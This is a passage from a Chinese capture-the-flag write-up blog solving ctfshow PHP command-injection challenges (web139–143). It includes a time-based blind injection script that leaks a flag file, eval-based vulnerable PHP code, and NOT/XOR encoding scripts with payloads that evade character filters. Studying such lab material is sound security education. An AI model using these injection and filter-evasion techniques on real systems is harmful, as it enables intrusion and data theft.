</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="k">if</span> <span class="n">n</span> <span class="o">==</span> <span class="s1">&#39;~&#39;</span><span class="p">:</span>    <span class="c1">#str的最后一位，“~”不常出现，用作结尾</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">                <span class="n">key</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">                
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="c1"># 在每次获取一个字符后，将一个空格添加到结果字符串中，用于分隔结果的不同位置</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="s2">&#34; &#34;</span>
</span></span></code></pre></div><p>这个脚本的原理其实就是，通过shell编程中的if语句判断</p>
<pre tabindex="0"><code>ls /|awk &#39;NR=={0}&#39;|cut -c {1}
</code></pre><p>中截取到的字符串是否与我们遍历的任一个字符匹配，若匹配成功则使用sleep命令使响应时间变为3s</p>
<p>而脚本通过判断响应时间即可知道截取到的字符是否匹配，从而一个一个字符的获取</p>
<p><img alt="image-20250124171223602" loading="lazy" src="assets/image-20250124171223602.png"></p>
<p>读到flag的位置，接下来就是读文件了，原理一样</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nb">str</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="o">+</span><span class="s2">&#34;-&#34;</span><span class="o">+</span><span class="s2">&#34;{&#34;</span><span class="o">+</span><span class="s2">&#34;}&#34;</span>    
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>          
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">99</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="mi">0</span>   
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">99</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="k">if</span> <span class="n">key</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">str</span><span class="p">:</span>      
</span></span><span class="line"><span class="ln">14</span><span class="cl">            <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;if [ `cat /f149_15_h3r3|awk &#39;NR==</span><span class="si">{0}</span><span class="s2">&#39;|cut -c </span><span class="si">{1}</span><span class="s2">` == </span><span class="si">{2}</span><span class="s2"> ];then sleep 3;fi&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>   
</span></span><span class="line"><span class="ln">15</span><span class="cl">            <span class="c1">#print(payload)</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">            <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://a37f8386-b265-4794-b4d1-7e4e62f05859.challenge.ctf.show//?c=&#34;</span> <span class="o">+</span> <span class="n">payload</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">                <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="p">(</span><span class="mf">2.5</span><span class="p">,</span> <span class="mf">2.5</span><span class="p">))</span>   
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl">			<span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="n">n</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">                
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="s2">&#34; &#34;</span>
</span></span></code></pre></div><p><img alt="image-20250124180128116" loading="lazy" src="assets/image-20250124180128116.png"></p>
<h4 id="web140">web140<a hidden class="anchor" aria-hidden="true" href="#web140">#</a></h4>
<p>函数的利用</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-17 12:39:25
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$f1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$f2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9]+$/&#39;</span><span class="p">,</span> <span class="nv">$f1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[a-z0-9]+$/&#39;</span><span class="p">,</span> <span class="nv">$f2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span> <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$f1</span><span class="s2">(</span><span class="si">$f2</span><span class="s2">());&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$code</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;ctfshow&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">                <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><a href="https://ctf.show/writeups/743106">原文</a></p>
<p>需要<code>$f1($f2());</code>的返回值，或者是字母开头的字符串，或者是空数组，或者就是0，或者FLASE。</p>
<p><strong>payload1</strong>： system(system())&mdash;&gt; <code>f1=system&amp;f2=system</code></p>
<p><code>string system( string $command[, int &amp;$return_var] )</code>：成功则返回命令输出的最后一行，失败则返回 FALSE 。system()必须包含参数，失败返回FLASE；system(&lsquo;FLASE&rsquo;)，空指令，失败返回FLASE。</p>
<p><strong>payload2</strong>： usleep(usleep())&mdash;&gt; <code>f1=usleep&amp;f2=usleep</code> usleep没有返回值。 所以intval参数为空，失败返回0</p>
<p><strong>payload3</strong>： getdate(getdate())&mdash;&gt; <code>f1=getdate&amp;f2=getdate</code></p>
<p><code>array getdate([ int $timestamp = time()] )</code>：返回结果是array，参数必须是int型。所以getdate(getdate())&mdash;-&gt;getdate(array型)&mdash;&gt;失败返回flase，intval为0。</p>
<h4 id="web141">web141<a hidden class="anchor" aria-hidden="true" href="#web141">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-17 19:28:09
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1">#error_reporting(0);
</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="c1"></span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\W+$/&#39;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span>  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$v1$v3$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$v1$v3$v2</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><pre tabindex="0"><code>preg_match(&#39;/^\W+$/&#39;, $v3)
</code></pre><p>此正则表达式用于检查字符串 <code>$v3</code> <strong>是否完全由非单词字符组成</strong>，且<strong>不能为空</strong>。（单词字符：字母、数字和下划线）</p>
<p>根据题目我们可以联想到取反，或，异或命令执行，这里随便一个都行</p>
<blockquote>
<p>php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。这样就好说了。构造出1-phpinfo()-1就可以了，也就是说 v1=1&amp;v2=1&amp;v3=-phpinfo()-</p></blockquote>
<p>羽师傅有个取反脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1">//在命令行中运行
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm">/*author yu22x*/</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nx">STDOUT</span><span class="p">,</span><span class="s1">&#39;[+]your function: &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="nv">$system</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">),</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">fgets</span><span class="p">(</span><span class="nx">STDIN</span><span class="p">));</span> 
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="nx">fwrite</span><span class="p">(</span><span class="nx">STDOUT</span><span class="p">,</span><span class="s1">&#39;[+]your command: &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nv">$command</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">),</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">fgets</span><span class="p">(</span><span class="nx">STDIN</span><span class="p">));</span> 
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">echo</span> <span class="s1">&#39;[*] (~&#39;</span><span class="o">.</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$system</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;)(~&#39;</span><span class="o">.</span><span class="nx">urlencode</span><span class="p">(</span><span class="o">~</span><span class="nv">$command</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="p">;</span>
</span></span></code></pre></div><p>直接用就行</p>
<p><img alt="image-20250124220654185" loading="lazy" src="assets/image-20250124220654185.png"></p>
<p>payload:</p>
<pre tabindex="0"><code>?v1=1&amp;v2=1&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)-
</code></pre><h4 id="web142">web142<a hidden class="anchor" aria-hidden="true" href="#web142">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-17 19:36:02
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">        <span class="nv">$d</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)(</span><span class="nv">$v1</span> <span class="o">*</span> <span class="mh">0x36d</span> <span class="o">*</span> <span class="mh">0x36d</span> <span class="o">*</span> <span class="mh">0x36d</span> <span class="o">*</span> <span class="mh">0x36d</span> <span class="o">*</span> <span class="mh">0x36d</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="nx">sleep</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题就是一个$d秒后出flag，直接传入v1=0，直接拿到flag</p>
<p>payload:</p>
<pre tabindex="0"><code>?v1=0
</code></pre><h4 id="web143">web143<a hidden class="anchor" aria-hidden="true" href="#web143">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-10-13 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-10-18 12:48:14
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="p">(</span><span class="nx">String</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&amp;|\;/i&#39;</span><span class="p">,</span> <span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s1">&#39;get out hacker!&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="nv">$code</span> <span class="o">=</span>  <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;return </span><span class="si">$v1$v3$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;</span><span class="si">$v1$v3$v2</span><span class="s2"> = &#34;</span><span class="o">.</span><span class="nv">$code</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>这题ban掉了取反，只能用其他位运算符构造payload</p>
<p>羽师傅的异或脚本</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*author yu22x*/</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nv">$myfile</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;xor_rce.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nv">$contents</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$j</span> <span class="o">&lt;</span><span class="mi">256</span> <span class="p">;</span> <span class="nv">$j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">			<span class="nv">$hex_i</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">16</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="s1">&#39;0&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">		<span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">			<span class="nv">$hex_j</span><span class="o">=</span><span class="nx">dechex</span><span class="p">(</span><span class="nv">$j</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">		<span class="nv">$preg</span> <span class="o">=</span> <span class="s1">&#39;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&amp;|\;/i&#39;</span><span class="p">;</span> <span class="c1">//根据题目给的正则表达式修改即可
